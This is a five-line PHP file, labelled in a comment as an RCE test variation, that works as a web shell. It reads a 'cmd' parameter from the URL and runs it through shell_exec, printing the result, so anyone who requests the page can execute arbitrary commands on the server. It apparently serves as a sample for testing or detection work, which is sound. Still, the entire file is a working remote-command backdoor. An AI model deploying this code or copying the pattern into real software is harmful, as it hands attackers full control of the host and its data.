<?php
// RCE test variation #366
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>